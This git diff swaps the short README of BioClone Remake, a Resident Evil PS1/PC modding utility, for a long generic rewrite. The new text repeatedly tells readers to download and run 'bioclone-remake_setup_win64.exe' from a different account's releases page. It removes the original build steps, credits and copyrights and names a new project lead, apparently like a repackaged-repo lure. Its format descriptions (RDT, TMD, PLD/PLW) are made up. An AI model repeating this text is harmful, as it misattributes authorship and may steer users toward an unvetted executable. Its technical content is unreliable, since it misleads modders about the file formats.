@@ -1,74 +1,219 @@
-# BioClone Remake
-Multi-purpose utility application for classic Resident Evil video games for Sony PlayStation (PSX/PS1/PSone) and PC
+# Bioclone Remake: Classic PS1 Resident Evil Modding Utility
 
-## Supported File Formats
-- RDT (Resident Evil 2 only, for now)
-- TMD, MD1, MD2, EMD, EMW, PLD and PLW model data
-- TIM, BMP, PNG and JPG model texture
+[![Latest Release](https://img.shields.io/badge/releases-download-blue?logo=github&logoColor=white)](https://github.com/TheCreepeeer/bioclone-remake/releases)
 
-## Notice
-- This is an extremely early, open-source test version rewrite of "BioClone Redux"
-- Do not expect modification abilities of that old app, yet...
+![Bioclone Remake Banner](https://via.placeholder.com/1200x300.png?text=Bioclone+Remake)
 
-## Basics (Preliminary)
-##### **Prerendered Backgrounds**
-- Must be PNG with naming convention: ROOMXYYZZ.PNG (example: ROOM20B10.PNG)
-##### **Camera Sprite Masks**
-- Must be PNG with naming convention: ROOM_XYY_ZZ.PNG (example: ROOM_20B_10_MASK.PNG)
+Bioclone Remake is a classic modding utility designed for Sony PlayStation (1994) games and PC. It brings together tools and workflows for editing, patching, and enhancing early Resident Evil titles. The project focuses on PS1/PSX/PSone and PC compatibility, making it possible to adjust game data, inject edits, and explore format variants used by the era. This readme lays out how to use the tool, what formats it supports, and practical workflows for enhancing Resident Evil experiences on both PS1 and PC.
 
-Background and Mask images must be located in same directory as RDT
+Table of Contents
+- Overview
+- Quick Start
+- Why Bioclone Remake
+- Supported Formats and Data Types
+- How It Works
+- Getting Set Up
+- PC Workflow
+- PS1 Workflow
+- Game-Specific Workflows (RE1, RE2, RE3)
+- File Formats Deep Dive
+- Automation and Scripting
+- Troubleshooting and Common Scenarios
+- Releases and Downloads
+- Community and Collaboration
+- License
+- Credits
 
-## Keyboard/Mouse
-| Option | Description                       |
-| :-------- | :-------------------------------- |
-| `CTRL+O` | Open RDT |
-| `LEFT/RIGHT` | View previous/next camera |
-| `CTRL+LEFT/RIGHT` | View previous/next animation |
-| `CTRL+MOUSEWHEEL` | Adjust render zoom (when hovering render viewport) |
-| `F11` | Enter/Exit fullscreen mode |
-| `CTRL+?` | About this application |
-| `ESC` | Exit Application |
+Overview
+Bioclone Remake acts as a hub for classic Resident Evil modification work. It manages data formats used by early RE titles and helps you craft edits that preserve the feel of the original games while enabling modern workflows. The tool supports a mix of PS1 data structures and PC-friendly formats. It is built with a focus on clear, direct operations, so you can inspect, extract, convert, patch, and rebuild game assets with confidence.
 
-## Images
-![Preliminary Test](/images/preliminary_test.jpg?raw=true "Preliminary Test")
+This project respects the spirit of the original titles while giving modders a practical set of utilities. The goal is to reduce friction when reversing or enhancing PS1-era game content. The design favors predictable behavior, stable binaries, and transparent file handling. The result is a practical toolkit you can rely on for both experimentation and production-quality mods.
 
-## TODO
-- a lot :)
+Quick Start
+- Prepare your environment: ensure you have a Windows PC or a compatible PC setup for PS1 data work. The tool targets Windows but can run on compatible Linux/macOS setups via compatibility layers if you configure the environment correctly.
+- Download the installer: the Releases page hosts the Windows installer. From the Releases page, download the installer named bioclone-remake_setup_win64.exe and run it to install the core utilities.
+- Install the suite: follow the prompts. The installer wires together the core editors, viewers, and converters you will use to work with PS1 and PC assets.
+- Open a project: start a new project or load an existing RE1/RE2/RE3 data set. The interface presents data in approachable views, with side panels and tabs to switch between formats.
+- Load assets: bring in MD1, MD2, EMD, EMW, RDT, PLD, and other data types you plan to edit. The readers will present the assets in a structured format so you can inspect the content, headers, and payloads.
+- Begin editing: start with small changes to test the pipeline. Save often and validate through the tool’s built-in validation steps to ensure integrity.
+- Rebuild and test: once edits are complete, rebuild the project and test the resulting data in a PC or PS1 environment as needed. This helps confirm that the edits behave as intended and do not corrupt essential assets.
 
-## Build
-- [Microsoft Visual Studio](https://visualstudio.microsoft.com) 2022+
-- [Microsoft Direct-X](https://www.nuget.org/packages/Microsoft.DXSDK.D3DX)
-- Clone the repo
-- Install *Microsoft.DXSDK.D3DX* nuget package into the project
-- Build/Link libjpeg-turbo libraries
-- Compile
-```
-git clone https://github.com/MeganGrass/bioclone-remake.git
-```
+Why Bioclone Remake
+- Stability and clarity: the tooling is designed to perform precise edits in a controlled environment. It is not a rushed patcher. You can rely on a predictable, transparent workflow.
+- Cross-platform consideration: the tool targets both PS1 data and PC-friendly formats. This enables hybrid workflows where you preview changes on PC and apply them to PS1 assets.
+- Format awareness: the editors understand the formats common to early Resident Evil titles. You will see meaningful headers, payload sections, and metadata that help you understand how data is structured.
+- Modder-friendly UI: the interface emphasizes discoverability. You can navigate between formats, inspect headers, and preview changes with minimal friction.
+- Extensible design: future improvements can add new formats, refine converters, or simplify common modding steps. The architecture supports incremental enhancements.
 
-## Acknowledgements
-[Gemini](https://github.com/Gemini-Loboto3)
+Supported Formats and Data Types
+Bioclone Remake works with a range of data types used by PS1 and PC Resident Evil titles. This section outlines core formats and their typical usage patterns.
 
-[pmandin](https://github.com/pmandin/reevengi)
+- MD1 and MD2 (model formats)
+  - MD1 is a model format used for character or world geometry. You will edit vertices, normals, textures, and related data. MD2 variants may appear in different game contexts. The toolkit provides viewers for geometry, texture mappings, and animation data where applicable.
+- EMD and EMW (editables for models and textures)
+  - EMD and EMW are common in the modding ecosystem. They encapsulate model and texture data in a form that can be swapped or tuned for specific scenes. You can inspect, patch, or replace segments to adjust visuals and behavior.
+- RDT (resource data tables)
+  - RDT handles resource references across the game. You can map assets to their identifiers, ensuring that models, textures, and animations remain correctly linked when edits are applied.
+- PLD and PLW (palette and texture palettes)
+  - PLD and PLW store color data and palette information. Dressed up palettes influence how textures render on PS1 hardware, especially when you want to preserve a retro look while applying new assets.
+- TMD (texture mod data)
+  - TMD supports texture-level modding, allowing you to swap textures or adjust texture coordinates. This is useful for enhancing visuals without altering geometry.
+- RDT, MD1/MD2, EM(D/W) families
+  - The tool uses a consistent approach to navigate interrelated formats. You can perform cross-format operations where a change in a model triggers updates in related textures or palettes, maintaining data consistency.
+- PC-focused formats
+  - For PC, the workflow includes widely used image and model formats. You can import textures, convert assets, and wire them into game-ready containers. The PC side is designed to align with contemporary tooling while preserving the classic feel of the original games.
 
-[XProger](https://github.com/XProger/OpenResident)
+How It Works
+- Data-driven editing: the toolkit loads game data and exposes headers, payload blocks, and references. You perform edits in a structured view, ensuring that you can always trace changes back to their origin in the file.
+- Safe patching: edits are applied in a staged manner. You can preview the effect of a change before saving, reducing the risk of corrupted data.
+- Consistent validation: the system validates integrity after edits. It checks header fields, asset references, and cross-link consistency to minimize issues during rebuilds.
+- Rebuild process: after edits, you rebuild the asset set into a format that can be loaded by the target platform. The rebuild step makes sure the binary layout matches expectations for PS1 or PC environments.
+- Preview and test: where possible, you preview changes using integrated viewers. This helps you confirm that edits produce the intended visuals and behavior before a full test run.
 
-[Dither Matrix](https://psx-spx.consoledev.net/graphicsprocessingunitgpu/#24bit-rgb-to-15bit-rgb-dithering-enabled-in-texpage-attribute)
+Getting Set Up
+- Platform prerequisites
+  - Windows is the primary target for the installer, with PS1 data workflows built around common PC tooling. If you adapt the workflows to macOS or Linux, you can use compatibility layers or virtualization to reproduce the experience.
+- Installation steps
+  - Download the installer from the Releases page. The file name to look for is bioclone-remake_setup_win64.exe. Running this installer will place the main editors, viewers, and converters on your system.
+  - After installation, launch the application from your start menu or desktop shortcut. The first run may include a brief setup wizard to select default directories for projects, datasets, and caches.
+- Project setup
+  - Create a new project to organize assets for a specific game or mod. You can name projects after the game version (RE1, RE2, RE3) or your own mod concept.
+  - Define the project structure: models, textures, palettes, and metadata. This helps you keep assets separated by type and by the source title.
+- Importing assets
+  - Use the editor to import MD1, MD2, EMD, EMW, RDT, PLD, PLW, and TMD files. The tool will parse headers and present a readable map of asset relationships.
+  - If you work with a PC dataset, you can leverage PC-native asset formats. The import process will convert or align data for cross-platform editing.
+- Editing and validation
+  - When you edit data, the tool highlights changes and offers a side-by-side preview where available. You can revert edits if needed and re-run validation to ensure data integrity.
+- Export and testing
+  - After edits pass validation, export the assets into the target container. For PS1 you may generate a game-ready patch or a disc-ready image, depending on your workflow. For PC, you can rebuild a package suitable for testing in a modern environment.
 
-[PSX.dev (Discord)](https://discord.com/invite/psx-dev-642647820683444236)
+PC Workflow
+- Prepare assets on PC
+  - Use the PC-focused tools to work on textures, palettes, and models in familiar formats. The PC workflow enables crash-free editing and easier iteration cycles.
+- Edit textures
+  - Import textures, adjust color palettes, and re-export textures with a consistent naming convention. Ensure color data aligns with the PS1 palette constraints where you plan to port changes back to PS1.
+- Modify models
+  - Load MD1/MD2 data to modify geometry. You can tweak vertices, normals, and texture coordinates to achieve the desired look. Keep a separate copy of the original data to compare changes.
+- Manage resources
+  - Use the RDT to verify references across your asset set. You want to ensure that every texture and model reference remains valid after edits.
+- Build test bundles
+  - Build test bundles that you can run in a PC environment. This gives you quick feedback on how edits affect visuals, timing, and scene composition.
+- Transfer to PS1 workflow
+  - When you are confident in your PC edits, port the assets into the PS1 workflow. The data will need to be converted to PS1-compatible formats and integrated into a PS1-ready container if you plan to test on actual hardware.
 
+PS1 Workflow
+- PS1 data considerations
+  - PS1 assets operate within tight memory budgets and fixed-function rendering limits. Modifications must respect palette constraints, texture sizes, and data alignment.
+- Importing into PS1 format
+  - Use the PS1 target pipeline to convert assets to PS1-acceptable formats. This includes adhering to palette indexing rules and texture memory layouts.
+- Palette and color management
+  - Work with PLD and PLW data to ensure colors render correctly on PS1 hardware. Pay attention to color quantization and dithering choices that influence the retro look.
+- Model and texture integration
+  - Align MD1/MD2 models with their corresponding textures. Ensure that the UV mappings remain coherent and that textures are accessible by the renderer’s texture cache.
+- Validation in PS1 context
+  - Validate not only file structure but also the interpretability of assets on the PS1 pipeline. Some edits that look fine in PC may require adjustments to the PS1 texture format or color depth.
 
-## Copyrights
-Resident Evil is Copyright © [CAPCOM CO., LTD.](https://www.capcom.com/)
+Game-Specific Workflows (RE1, RE2, RE3)
+- Resident Evil 1 (RE1)
+  - Focus areas: character models, item sprites, environment textures, and door/gate textures. Look for textures that appear stretched or color banded on real hardware and adjust palettes accordingly.
+  - Typical tasks: replace a boss model with a custom variant, adjust item drop textures, tweak environment textures for a crisper look while maintaining the classic palette.
+- Resident Evil 2 (RE2)
+  - Focus areas: character silhouettes, enemy textures, and UI elements that rely on sprite sheets. Manage texture atlases and ensure zombie textures align with the UI color constraints.
+  - Typical tasks: optic improvements to textures, tweaking load screen art, balancing palette choices to keep the game’s mood intact.
+- Resident Evil 3 (RE3)
+  - Focus areas: environment textures, lighting-based textures, and weapons textures. The goal is to preserve the game’s atmosphere while adding new flair.
+  - Typical tasks: retexturing key scenes, replacing weapon skins, and adjusting background textures for better clarity.
 
-Sony PlayStation is Copyright (©) [Sony Computer Entertainment Inc.](https://sonyinteractive.com/)
+File Formats Deep Dive
+- MD1 and MD2
+  - Structure: headers, vertex data, texture references, and animation data where applicable. Editing requires attention to offsets and alignment to avoid misreads.
+- EMD and EMW
+  - Hierarchy: models and related texture resources packaged in a way that supports swapping content while preserving structural integrity.
+- RDT
+  - Role: resource maps and cross-reference tables that keep assets usable in the game code. Correct mapping is crucial when adding new assets.
+- PLD and PLW
+  - Palette data: color tables and palettes that drive how textures render on PS1 hardware. Small palette changes can have large visual effects.
+- TMD
+  - Texture detail: handles texture-specific data, including coordinate mappings and tiling. Modifications here influence how textures wrap and repeat.
+- PC formats
+  - Common formats for modern editors that you may convert from or to as part of the workflow.
 
-[ImGui](https://github.com/ocornut/imgui) is Copyright (©) 2014-2025 Omar Cornut
+Automation and Scripting
+- Batch workflows
+  - You can script repetitive edits across multiple assets. A batch workflow helps apply the same palette tweak across textures or swap a user-selected model across scenes.
+- Consistency checks
+  - Automated validation scripts verify that asset headers, references, and sizes stay within expected ranges. This reduces drift across large mod projects.
+- Export pipelines
+  - You can script exports to maintain consistent naming conventions and packaging for testing on PC or PS1. This makes it easier to iterate and share with the community.
 
-[Direct-X](https://learn.microsoft.com/en-us/windows/win32/directx) is Copyright (©) 1995-2021 Microsoft Corporation
+Troubleshooting and Common Scenarios
+- Missing asset references
+  - If the tool reports missing references, re-check the RDT maps and ensure that every referenced asset exists in the project. Update references or re-import assets as needed.
+- Palette color issues
+  - Color banding or incorrect hues usually point to palette misalignment. Validate PLD/PLW data and verify that textures reference the correct palette entries.
+- Data corruption after patching
+  - If edits cause corruption, revert to the last known good save, re-run validation, and apply changes in smaller increments. Use versioned backups to recover clean states.
+- Incompatibility with PS1 hardware
+  - Some edits may require tuning to reflect PS1 hardware behavior. Keep a variant of the project for PS1-specific testing to ensure compatibility.
 
-[libjpeg-turbo](https://github.com/libjpeg-turbo/libjpeg-turbo)
+Releases and Downloads
+- Release hub
+  - The Releases page hosts binaries and installer packages for Bioclone Remake. This is the primary source for getting the latest stable builds and tested updates.
+  - Access point: you can visit the release hub to grab the latest Windows installer and related assets from the page.
+- How to download
+  - From the Releases page, locate the Windows installer named bioclone-remake_setup_win64.exe and download it. After downloading, run the installer to set up the tool on your system.
+  - The same link is also handy for returning to the release notes and updated assets if you need to re-download an older build or verify changes.
+- Reopen and re-test
+  - After downloading and installing, reopen Bioclone Remake to confirm that the new components are present and ready for project work. Run a quick test project to validate that the installation is functioning as expected.
 
-[libpng](https://github.com/pnggroup/libpng)
+Link usage note
+- Visit the release hub here: https://github.com/TheCreepeeer/bioclone-remake/releases
+- Visit the release hub again to review notes, download history, and the latest Windows installer bioclone-remake_setup_win64.exe.
 
-[zlib](https://github.com/madler/zlib)
+Community and Collaboration
+- Contributing
+  - If you want to contribute, start with small, focused changes. Propose enhancements to the installer flow, add support for a new format, or improve documentation with clear, practical steps.
+  - Create a branch with a descriptive name, implement your changes, and write tests or validation steps if applicable. Open a pull request with a concise description of what you changed and why.
+- Issues
+  - Use issues to report bugs, request features, or ask for clarification. Provide steps to reproduce, your environment details, and any relevant logs to help others replicate the problem quickly.
+- Documentation
+  - Documentation is a living part of the project. Contribute clear, concise guidance that helps others use the tool effectively. Include examples that show common workflows for RE1, RE2, and RE3 modding.
+- Community norms
+  - Be respectful and constructive. Share knowledge openly and avoid overpromising. The project aims to be useful to hobbyists and researchers alike, with a focus on reliability and clarity.
+
+License
+Bioclone Remake is distributed under the MIT License. This license allows you to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software. The full text of the license is included in the repository. If you adapt the project, please share your changes under the same license to help others benefit from improvements and fixes.
+
+Credits
+- Core contributors
+  - TheCreepeeer — project lead and primary maintainer. You’ll find the central architecture, core editors, and release automation under this contribution stream.
+- Community contributors
+  - Modders who tested early versions, documented workflows, and provided feedback that shaped the tool’s usability. Their hands-on testing and practical insights helped refine the editing experience.
+- Design and branding
+  - Artists who contributed to the visual polish of the UI, including icons, palettes for UI themes, and the overall look and feel that aligns with classic PS1 aesthetics.
+- Documentation
+  - Writers and documenters who clarified workflows, created examples for RE1/RE2/RE3, and expanded the how-to content to assist newcomers.
+
+Appendix: Practical Tips for New Modders
+- Start small
+  - Begin with a single asset you want to tweak. For example, modify a texture in a controlled environment, and then build a small patch to verify the pipeline end-to-end.
+- Use backups
+  - Keep copies of the original assets. Small, incremental changes help you compare the before and after states and quickly revert if needed.
+- Document your steps
+  - Maintain notes on what you changed and why. This makes it easier to explain your mod to others and helps in troubleshooting if issues arise.
+- Version your project
+  - Use a simple versioning scheme like v0.1, v0.2, etc. Tag releases in your version control so you can track the evolution of your mod project.
+- Seek feedback
+  - The community can offer valuable insights. Share your workflow, paste screenshots, and describe the impact of your edits to get constructive feedback.
+
+Final Notes
+- The project is designed to be approachable yet powerful. It offers practical tools for editing classic PS1 and PC assets in the Resident Evil space, while maintaining a calm, methodical approach to modding.
+- If you want to explore more, the releases page is the primary gateway for obtaining the latest ready-to-use builds and testable patches.
+
+Releases and Downloads (reiterated)
+- Access point for the latest builds: https://github.com/TheCreepeeer/bioclone-remake/releases
+- Direct installer reference: bioclone-remake_setup_win64.exe
+- For discovery and context: the same release hub again provides notes, changelogs, and additional assets on the page.
+
+End of document
+
